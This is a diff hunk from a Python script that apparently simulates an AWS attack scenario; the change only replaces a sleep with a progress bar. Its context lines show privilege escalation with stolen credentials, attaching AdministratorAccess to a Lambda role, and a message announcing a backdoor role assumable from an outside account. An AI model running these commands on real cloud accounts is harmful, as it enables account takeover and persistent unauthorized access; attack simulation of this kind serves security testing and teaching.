@@ -159,11 +159,19 @@ def scenario_2_execute():
     subprocess.call(""+creds+" && aws sts get-caller-identity", shell=True)
     
     print(colored("PrivEsc possible through this credential, Escalating role privileges", color="red"))
-    loading_animation()
-    print("-"*30)
     subprocess.call(""+creds+" && aws iam attach-role-policy --policy-arn arn:aws:iam::aws:policy/AdministratorAccess --role-name "+LAMBDA_ROLE_NAME+"", shell=True)
-    
-    sleep(60)
+    sleep_duration = 60
+    with tqdm(total=sleep_duration, desc="Loading") as pbar:
+        # Loop until sleep_duration is reached
+        while sleep_duration > 0:
+            # Sleep for a shorter interval to update the progress bar
+            sleep_interval = min(1, sleep_duration)
+            sleep(sleep_interval)
+            
+            # Update the progress bar with the elapsed time
+            pbar.update(sleep_interval)
+            sleep_duration -= sleep_interval
+
     subprocess.call("curl '"+API_GW_URL+"?query=ping'", shell=True)
     print(colored("Creating a Backdoor Role which can be assumed from custom AWS account", color="red"))
     loading_animation()
